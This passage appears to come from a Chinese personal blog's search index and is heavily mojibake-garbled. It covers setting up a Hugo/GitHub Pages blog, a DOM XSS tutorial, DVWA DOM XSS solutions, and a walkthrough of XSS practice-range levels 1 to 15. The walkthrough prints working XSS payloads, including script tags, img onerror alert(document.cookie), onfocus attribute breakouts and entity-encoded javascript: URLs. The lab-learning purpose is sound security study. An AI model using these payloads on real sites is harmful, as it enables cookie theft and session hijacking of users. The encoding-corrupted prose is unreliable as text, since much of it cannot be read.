gæ˜¯éƒ¨ç½²ï¼Œsæ˜¯æœ¬åœ°å¯åŠ¨æœ¬åœ°é¢„è§ˆæ•ˆæœå¦‚ä¸‹ï¼š ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:4","tags":["åšå®¢éƒ¨ç½²"],"title":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"äº”ã€éƒ¨ç½²åˆ° Github ä¸Š è¯¦ç»†çœ‹å‚è€ƒï¼šhttps://blog.csdn.net/yaorongke/article/details/119089190 è®¿é—®åœ°å€æ•ˆæœï¼š ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:5","tags":["åšå®¢éƒ¨ç½²"],"title":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"å…­ã€ä¸»é¢˜é…ç½® è¿™é‡Œé€‰æ‹©ä¸‹è½½ä¸»é¢˜ butterflyï¼Œ è·Ÿå¤šä¸»é¢˜è¯¦ç»†é…ç½®å‚è€ƒï¼šbutterflyä¸»é¢˜é…ç½® ä¸»é¢˜é­”æ”¹å‚è€ƒï¼šbutterflyä¸»é¢˜é­”æ”¹ ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:6","tags":["åšå®¢éƒ¨ç½²"],"title":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"Github Pages+ Hugo æ­å»ºä¸ªäººåšå®¢ å‚è€ƒï¼šhttps://www.shaohanyun.top/posts/env/blog_build2/ å‚è€ƒï¼šhttps://github.com/lazeroffmichael/example-hugo-blog å‚è€ƒï¼šhttps://lianpf.github.io/posts/other/tools-docs-hugo-papermod/ ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:2:0","tags":["åšå®¢éƒ¨ç½²"],"title":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"ä¸€ã€ä¸»é¢˜é…ç½® æŠŠä¹‹å‰çš„ gaorenyusi.github.io ä»“åº“æ¸…ç©ºï¼Œç„¶åä¸‹è½½ hugoï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤ç”Ÿæˆç½‘ç«™ä¸»æ–‡ä»¶ hugo new site blog hugo new site blog --format yamlç„¶åä¸‹è½½ä¸»é¢˜ï¼ˆè¿™é‡Œç”¨çš„æ˜¯LoveItä¸»é¢˜ï¼Œä½†è¿˜æ˜¯å¯ä»¥å‚è€ƒä¸Šé¢é“¾æ¥ï¼‰ cd blog git clone https://github.com/dillonzq/LoveIt.git themes/LoveItå¯ä»¥æŠŠ exampleSite ç›®å½•ä¸­çš„é…ç½®æ–‡ä»¶ hugo.toml å¤åˆ¶åˆ°ä¸»æ–‡ä»¶ï¼Œç„¶åæ ¹æ®éœ€è¦ä¿®æ”¹ hugo.toml æˆ‘çš„é…ç½®æ–‡ä»¶ï¼šÂ hugo.toml. æœ€åæ‰§è¡Œä¸‹é¢å‘½ä»¤è¿›è¡Œæœ¬åœ°é¢„è§ˆ hugo server -D-D æ˜¯ç”Ÿæˆ public ç›®å½•ï¼Œç„¶åè®¿é—®åœ°å€ http://localhost:1313 è¿›è¡Œæœ¬åœ°è®¿é—®ï¼Œ æ›´å¤šä¸»é¢˜é…ç½®: LoveItä¸»é¢˜é…ç½® ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:2:1","tags":["åšå®¢éƒ¨ç½²"],"title":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"äºŒã€éƒ¨ç½²åˆ° github pages åœ¨ public ç›®å½•ä¸‹æ‰§è¡Œä¸‹é¢å‘½ä»¤å³å¯ï¼Œ git init git add . git commit -m \"first commit\" git branch -M main git remote add origin ä»“åº“åœ°å€ git push -u origin main -f","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:2:2","tags":["åšå®¢éƒ¨ç½²"],"title":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"ä¸‰ã€Action è‡ªåŠ¨æäº¤åšå®¢ ä»€ä¹ˆæ˜¯Github Action?\rGithub Action æ˜¯ Github æä¾›çš„ CI ç³»ç»Ÿï¼Œå¯ä»¥è®©ç”¨æˆ·ç¼–å†™è„šæœ¬ï¼Œå¹¶åœ¨è§¦å‘æŒ‡å®šçš„æ“ä½œåï¼ˆæ¯”å¦‚æ–° commit push åˆ°ä»“åº“ï¼‰ï¼Œè‡ªåŠ¨è§¦å‘è„šæœ¬ã€‚å®ƒå¯ä»¥ï¼š ç¼–è¯‘é¡¹ç›® æµ‹è¯•é¡¹ç›® ç™»é™†è¿œç¨‹æœåŠ¡å™¨ å‘å¸ƒæœåŠ¡ ç­‰ç­‰â€¦â€¦ å…·ä½“é…ç½®å‚è€ƒï¼šhttps://ratmomo.github.io/p/2024/06/%E4%BD%BF%E7%94%A8-hugoâ€“github-pages-%E9%83%A8%E7%BD%B2%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/#%E7%95%AA%E5%A4%96%E7%AF%87%E4%BD%BF%E7%94%A8github-action%E8%87%AA%E5%8A%A8%E5%8F%91%E5%B8%83%E5%8D%9A%E5%AE%A2 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:2:3","tags":["åšå®¢éƒ¨ç½²"],"title":"Github Pagesåšå®¢æ­å»ºæ•™ç¨‹","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"DOMå‹XSSå­¦ä¹  Psï¼šä¹‹å‰ä¸€ç›´æ²¡å¥½å¥½å­¦è¿‡ xssï¼Œç‰¹åˆ«æ˜¯ dom å‹ xss å¿«å¿˜å¾—å·®ä¸å¤šäº†ï¼Œæ‰€ä»¥ä»Šå¤©æŠ½ç©ºç®€å•è¡¥è¡¥ï¼Œä¹Ÿä¸æ˜¯å­¦å¾—å¾ˆæ·±å…¥ã€‚ ","date":"2024-10-31","objectID":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/:0:0","tags":["xss"],"title":"DOMå‹XSSå­¦ä¹ ","uri":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"DOM å‹ XSS æ˜¯ä»€ä¹ˆ DOMå‹XSSæ˜¯åŸºäºDOMæ–‡æ¡£å¯¹è±¡æ¨¡å‹çš„ä¸€ç§æ¼æ´ï¼ŒDOM å‹ XSS å¹¶ä¸ä¼šå’Œåå°è¿›è¡Œäº¤äº’ã€‚ç”±å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºé€šè¿‡DOMåŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œä»å®¢æˆ·ç«¯è·å¾—DOMä¸­çš„æ•°æ®ï¼ˆå¦‚ä»URLä¸­è·å–æ•°æ®ï¼‰å¹¶åœ¨æœ¬åœ°è¿›è¡Œæ‰§è¡Œã€‚ å¸¸è§çš„å±é™©å±é™©å‡½æ•°å¦‚ï¼š document.URLï¼Œdocument.writeï¼Œlocationï¼Œwindow.locationã€‚ å¦‚ä¸‹é¢çš„HTMLæ–‡ä»¶å°±å­˜åœ¨DOMå‹XSSï¼Œå…¶åŠŸèƒ½æ˜¯å½“æˆ‘ä»¬åœ¨URLæ è¾“å…¥å‚æ•°nameçš„å€¼åï¼Œå°±ä¼šåœ¨å½“å‰é¡µé¢æ˜¾ç¤ºè¾“å…¥å¦‚çš„nameçš„å€¼ï¼Œå…¶åŠŸèƒ½çš„å®ç°å…¨éƒ½åœ¨å‰ç«¯JSä¸­è¿›è¡Œã€æœªä¸åå°è¿›è¡Œä»»ä½•äº¤äº’ï¼š \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eDOM XSS\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cscript\u003e var pos=document.URL.indexOf(\"name=\")+5; document.write(decodeURI(document.URL.substring(pos,document.URL.length))); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003edocument.URL è·å–ç”¨æˆ·è¾“å…¥ï¼Œä»£ç ä¸­æœªç»è¿‡ä»»ä½•è¿‡æ»¤å°±ä¼ é€’ç»™äº† document.write è¾“å‡ºåˆ°å½“å‰é¡µé¢ä¸­ã€‚é‚£ä¹ˆä¼ å…¥ name=\u003cscript\u003ealert (111)\u003c/script\u003e å°±å¯ä»¥è§¦å‘ xss æ¼æ´ æ˜¯ä¸æ˜¯æ„Ÿè§‰å¾ˆåƒåå°„å‹ xssï¼Œåªæ˜¯ä¸åŒçš„æ˜¯è¿™é‡Œä¸ä¼šåç«¯è¿›è¡Œäº¤äº’ï¼Œå¯ä»¥çœ‹åˆ° dom ä¸­å·²ç»æ’å…¥äº†æˆ‘ä»¬çš„å…ƒç´ ï¼Œ ä½†æ˜¯æŸ¥çœ‹æºç æ˜¯æ²¡æœ‰çš„ã€‚ ","date":"2024-10-31","objectID":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/:1:0","tags":["xss"],"title":"DOMå‹XSSå­¦ä¹ ","uri":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"å¸¸è§çš„å±é™©å‡½æ•° ä¸‹é¢åˆ—ä¸‹å¤–éƒ¨è¾“å…¥Sourceså’Œå±é™©æ•æ„Ÿæ“ä½œSinksï¼ˆåŒ…æ‹¬æ‰§è¡Œ/è¾“å‡ºé¡µé¢ï¼‰ï¼Œè€Œå¯¹äºDOMå‹XSSæ¼æ´æŒ–æ˜æ¥è¯´ï¼Œå¯ä»¥ç®€å•å½’çº³ä¸ºåœ¨å®¢æˆ·ç«¯åŠ è½½çš„JSä»£ç ä¸­ï¼Œå­˜åœ¨Sources+Sinksçš„æƒ…å†µå³æœ‰å¯èƒ½å­˜åœ¨DOMå‹XSSã€‚ Sources document.URL document.URLUnencoded document.locationï¼ˆåŠå…¶è®¸å¤šå±æ€§ï¼‰ document.referrer window.locationï¼ˆåŠå…¶è®¸å¤šå±æ€§ï¼‰ location location.href location.search location.hash location.pathname Sinks ç›´æ¥æ‰§è¡Œè„šæœ¬ç±» eval(â€¦) window.execScript(â€¦) window.setInterval(â€¦) window.setTimeout(â€¦) å†™HTMLé¡µé¢ç±» document.write(â€¦) document.writeln(â€¦) element.innerHTML(â€¦) ç›´æ¥ä¿®æ”¹DOMç±» document.forms[0].action=â€¦ (and various other collections) document.attachEvent(â€¦) document.createâ€¦(â€¦) document.execCommand(â€¦) document.body. â€¦ (accessing the DOM through the body object) window.attachEvent(â€¦) æ›¿æ¢æ–‡æ¡£URLç±» document.location=â€¦ (and assigning to locationâ€™s href, host and hostname) document.location.hostname=â€¦ document.location.replace(â€¦) document.location.assign(â€¦) document.URL=â€¦ window.navigate(â€¦) æ‰“å¼€/ä¿®æ”¹çª—å£ç±» document.open(â€¦) window.open(â€¦) window.location.href=â€¦ (and assigning to locationâ€™s href, host and hostname) å½“ç„¶ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰æ¯”è¾ƒç»†èŠ‚çš„ç‰¹æ€§è¿™é‡Œå°±ä¸åˆ—ä¸¾äº†ï¼Œå¯è‡ªè¡Œç ”ç©¶ã€‚ ç›¸å…³ä¾‹å­å‚è€ƒï¼šhttp://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/ ","date":"2024-10-31","objectID":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/:2:0","tags":["xss"],"title":"DOMå‹XSSå­¦ä¹ ","uri":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"DVWA çš„ DOM å‹ XSS å¼€é¢˜ï¼š éš¾åº¦ï¼šä¸€ã€ç®€å• ç”±äºæ˜¯ dom å‹ xss ç›´æ¥æŸ¥çœ‹å…¶å…ƒç´ ã€‚ çœ‹åˆ°å…ˆæ˜¯è·å–å‚æ•° defalut çš„å€¼ç„¶åæŠŠå…¶å†™å…¥ \u003coptinon\u003e æ ‡ç­¾ä¸­ï¼Œç„¶åæŸ¥çœ‹æºç å‘ç°æ²¡æœ‰ä»»ä½•è¿‡æ»¤ \u003c?php #Â NoÂ protections,Â anythingÂ goes ?\u003e æ‰€ä»¥ä¼ å‚?default=\u003cscript\u003ealert(\"aaa\")\u003c/script\u003e æ‰§è¡Œ å‘ç°å…ƒç´ å·²ç»æˆåŠŸæ’å…¥ éš¾åº¦ï¼šäºŒã€ä¸­ç­‰ åŸç†æ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯å¤šåšäº†äº›è¿‡æ»¤ï¼ŒæŸ¥çœ‹æºç  \u003c?php //Â IsÂ thereÂ anyÂ input? ifÂ (Â array_key_exists(Â \"default\",Â $_GETÂ )Â \u0026\u0026Â !is_nullÂ ($_GET[Â 'default'Â ])Â )Â {Â $defaultÂ =Â $_GET['default'];Â #Â DoÂ notÂ allowÂ scriptÂ tagsÂ ifÂ (striposÂ ($default,Â \"\u003cscript\")Â !==Â false)Â {Â headerÂ (\"location:Â ?default=English\"); exit; } } ?\u003e æ„æ€å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å‚æ•°å€¼ä¸­ä¸èƒ½æœ‰ \u003cscript æ ‡ç­¾ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ç”¨å…¶å®ƒçš„æ ‡ç­¾ HTML çš„Â \u003c img \u003eÂ æ ‡ç­¾å®šä¹‰ HTML é¡µé¢ä¸­çš„å›¾åƒï¼Œè¯¥æ ‡ç­¾æ”¯æŒÂ onerror äº‹ä»¶ï¼Œåœ¨è£…è½½æ–‡æ¡£æˆ–å›¾åƒçš„è¿‡ç¨‹ä¸­å¦‚æœå‘ç”Ÿäº†é”™è¯¯å°±ä¼šè§¦å‘ã€‚ä½¿ç”¨è¿™äº›å†…å®¹æ„é€ å‡º payload å¦‚ä¸‹ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰å›¾ç‰‡å¯ä¾›è½½å…¥ï¼Œå› æ­¤ä¼šå‡ºé”™ä»è€Œè§¦å‘ onerror äº‹ä»¶è¾“å‡º cookieã€‚æ‰€ä»¥æ„é€ ï¼š ?default=English\u003c/option\u003e\u003c/select\u003e\u003cimg src = 1 onerror = alert(document.cookie)\u003eæˆ–è€… \u003e\u003c/option\u003e\u003c/select\u003e\u003ciframe onload=alert(/xss/)\u003eéš¾åº¦ï¼šä¸‰ã€å›°éš¾ æºç ï¼š \u003c?php //Â IsÂ thereÂ anyÂ input? ifÂ (Â array_key_exists(Â \"default\",Â $_GETÂ )Â \u0026\u0026Â !is_nullÂ ($_GET[Â 'default'Â ])Â )Â {Â #Â WhiteÂ listÂ theÂ allowableÂ languagesÂ switchÂ ($_GET['default'])Â { caseÂ \"French\": caseÂ \"English\": caseÂ \"German\": caseÂ \"Spanish\":Â #Â okÂ break; default:Â headerÂ (\"location:Â ?default=English\"); exit; } } ?\u003e å‘ç°æ˜¯ä¸ªç™½åå•ï¼Œåªå…è®¸è¾“å…¥æŒ‡å®šçš„å‚æ•°ï¼Œå…¶ä»–çš„éƒ½ä¼šè·³è½¬ä¸º ?default=English ä½†è¿™é‡Œæ²¡è¿‡æ»¤ \u003cscript\u003e æ ‡ç­¾ã€‚ ç®€å•æ„é€ ï¼š English #\u003cscript\u003ealert(document.cookie)\u003c/script\u003e","date":"2024-10-31","objectID":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/:3:0","tags":["xss"],"title":"DOMå‹XSSå­¦ä¹ ","uri":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"XSSé¶åœº ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:0:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-1 å‘ç°æœ‰ä¸ªnameä¼ å‚ï¼Œçœ‹æºä»£ç  get ä¼ å‚ name çš„å€¼ test æ’å…¥äº† html é‡Œå¤´ ç„¶ååº”ç”¨ alter å‡½æ•°å°±èƒ½è§¦å‘ç¬¬äºŒå…³ï¼Œé‚£ä¹ˆä¼ å…¥ \u003cscript\u003ealert()\u003c/script\u003e ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:1:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-2 ä¼ å…¥å‚æ•°å€¼ \u003cscript\u003ealert()\u003c/script\u003eæŸ¥çœ‹æºä»£ç  \u003c\u003eç¬¦å·è¢«è½¬ä¹‰ï¼Œä½†æ˜¯ä¸‹é¢ä¸€å¥æ˜¯æ­£å¸¸çš„ï¼Œä¼ å…¥çš„ â€œ\u003eå’Œ\u003câ€œä¸å‰åå½¢æˆé—­åˆã€‚ä»è€Œè¢«å½“ä½œæ ‡ç­¾å¤„ç†ï¼Œæ‰€ä»¥ä¼ å…¥ \"\u003e\u003cscript\u003ealert()\u003c/script\u003e\u003c\"","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:2:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-3 æŸ¥çœ‹æºç å‘ç°ä¸Šä¸‹éƒ½è¢«è½¬ä¹‰äº†ï¼Œ æœ‰ input æ ‡ç­¾ï¼Œé‚£ä¹ˆå°± onfocus äº‹ä»¶ç»•è¿‡ï¼Œæ‰€ä»¥ä¼ å…¥ ' onfocus=javascript:alert() 'å•å¼•å·å’Œå‰åé—­åˆï¼Œjavascript: æ˜¯ä¼ªåè®®ï¼Œä¼ å…¥åå†æ¬¡ç‚¹å‡»è¾“å…¥æ¡†è§¦å‘ã€‚ ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:3:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-4 æŸ¥çœ‹æºä»£ç å‘ç° input æ ‡ç­¾ä¼šè‡ªåŠ¨åˆ é™¤å°–æ‹¬å·ï¼Œç»§ç»­ç”¨level-3çš„æ–¹æ³•ï¼Œæ”¹æˆåŒå¼•å·é—­åˆã€‚è®°å¾—ç©ºæ ¼ ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:4:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-5 æŸ¥çœ‹æºä»£ç ï¼Œ ç›´æ¥çœ‹æºç å§ï¼Œå‘ç°å‡½æ•° strtolower ä¼šè½¬ä¸ºå°å†™ï¼Œæ‰€ä»¥ä¸èƒ½å¤§å°å†™ç»•è¿‡ã€‚å‰å‡ å…³çš„æ–¹æ³•ä¹Ÿç”¨ä¸äº†äº†ï¼Œé‚£ä¹ˆè¿™é‡Œä¼ å…¥ \"\u003e\u003ca href=javascript:alert()\u003exxx\u003c/a\u003e\u003c\" ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:5:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-6 æ¯”ä¸Šä¸€å…³å¤šè¿‡æ»¤äº† href ï¼Œä½†è¿™å…³å¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡ å› ä¸ºstr_replace()å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™ï¼Œè¿™é‡Œåˆæ²¡åŠ å¤§å†™è½¬å°å†™çš„å‡½æ•° ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:6:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"leve-7 æŸ¥çœ‹æºç å‘ç°ä¼šæŠŠå…³é”®å­—æ›¿æ¢ä¸ºç©ºã€‚å¯ä»¥åŒå†™ç»•è¿‡ ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:7:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-8 ç›´æ¥çœ‹æºç  è¿‡æ»¤çš„æœ‰ç‚¹å¤šï¼Œå¯ä»¥ä½¿ç”¨unicodeç¼–ç ç»•è¿‡ åœ¨çº¿ç¼–ç ç½‘å€ï¼šhttps://www.matools.com/code-convert-unicodeï¼Œå’Œå¦ä¸€ç§çš„åŒºåˆ« ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:8:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-9 å¤šäº†ä¸ªæ¡ä»¶ ä¹Ÿå°±æ˜¯ä¼ çš„å€¼è¦æœ‰ http:// ï¼Œå³ä¼ å…¥ \u0026#106;\u0026#97;\u0026#118;\u0026#97;\u0026#115;\u0026#99;\u0026#114;\u0026#105;\u0026#112;\u0026#116;\u0026#58;\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116;\u0026#40;\u0026#41;/* http:// */ ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:9:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-10 æŸ¥çœ‹æºç  å‘ç°æœ‰éšè—å‚æ•° t_sort ï¼Œå¯ä»¥çœ‹åˆ°è¿˜è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œç”¨ onfocus äº‹ä»¶ç»•è¿‡ã€‚è¿™é‡Œè¿˜è¦æŠŠ type ä» hidden æ”¹ä¸º test \" onfocus=javascript:alert() type=\"text ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:10:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-11 ![å±å¹•æˆªå›¾ 2024-01-10 142511](https://raw.githubusercontent.com/gaorenyusi/img/master/img/å±å¹•æˆªå›¾ 2024-01-10 142511.png) å››ä¸ªéšè—å‚æ•°ï¼Œéƒ½è¿›è¡Œä¼ å‚ï¼Œå‘ç°åªæœ‰ t_sort æœ‰æ•°æ®ï¼Œä½†è¢«è½¬ä¹‰äº†ï¼Œç„¶åçœ‹wpè¯´ ref æ˜¯ referer å¤´éƒ¨çš„æ•°æ®ï¼Œç„¶åè¿‡æ»¤äº†\u003c\u003e æ‰€ä»¥ä¸Šé¢çš„payloadç»§ç»­ç”¨ï¼Œåˆ©ç”¨hackerä¼ åˆ°refererå¤´éƒ¨ ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:11:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-12 çœ‹æºç  ä»uaä¸éš¾çœ‹å‡ºæ˜¯user agentå¤´éƒ¨ï¼Œå’Œä¸Šå…³åŒºåˆ«ä¸å¤§ ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:12:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-13 è¿™æ¬¡å‚æ•°æ˜¯ t_cook ï¼Œé‚£ä¹ˆçœ‹æ¥æ˜¯cookieäº†ï¼ŒæŠ“åŒ…çœ‹çœ‹å‚æ•° userï¼Œé‚£ä¹ˆç»™userä¼ ä¸Šé¢æ„é€ ã€‚å¾—åˆ° è¿™ä¸ªä¹Ÿè¡Œ \" onclick=alert() type=\"text ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:13:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-14 è¿™å…³å¡çš„ iframe å¼•ç”¨çš„åœ°å€æ‰“ä¸å¼€äº†ï¼Œå‚è€ƒå¸ˆå‚…ä»¬çš„14å…³å¯ä»¥è‡ªå·±æœ¬åœ°æ­å»ºï¼Œæ„æ€å°±æ˜¯å¼•ç”¨åˆ°æœ¬åœ°çš„ç½‘å€ï¼Œåœ¨æœ¬åœ°æ”¾ä¸Š exif xss æ¼æ´ã€‚ å¤åˆ¶å¸ˆå‚…ä»¬çš„ä»£ç ï¼Œå¼€å¯ exif ï¼Œ æŠŠåœ°å€æ”¹ä¸º http://127.0.0.1:89ï¼Œç„¶åä¸Šä¼ çš„å›¾ç‰‡é‡Œé¢æœ‰xssæ¶æ„ä»£ç å°±ä¼šå› ä¸ºexifè§£æè€Œè§¦å‘ï¼Œ åé¢æ¢æˆäº†index.phpï¼Œç«¯å£æ¢ä¸€ä¸‹å°±è¡Œï¼Œå½±å“ä¸å¤§ï¼Œ ![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/å±å¹•æˆªå›¾ 2024-01-10 152026.png) å‚è€ƒï¼šhttps://blog.csdn.net/qq_40929683/article/details/120422266 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:14:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-15 æºä»£ç  ng-includeæŒ‡ä»¤å°±æ˜¯æ–‡ä»¶åŒ…æ¶µçš„æ„æ€ï¼Œç”¨æ¥åŒ…æ¶µå¤–éƒ¨çš„htmlæ–‡ä»¶ï¼Œå¦‚æœåŒ…æ¶µçš„å†…å®¹æ˜¯åœ°å€ï¼Œéœ€è¦åŠ å¼•å·åˆ—å¦‚ ç„¶åæœ‰ 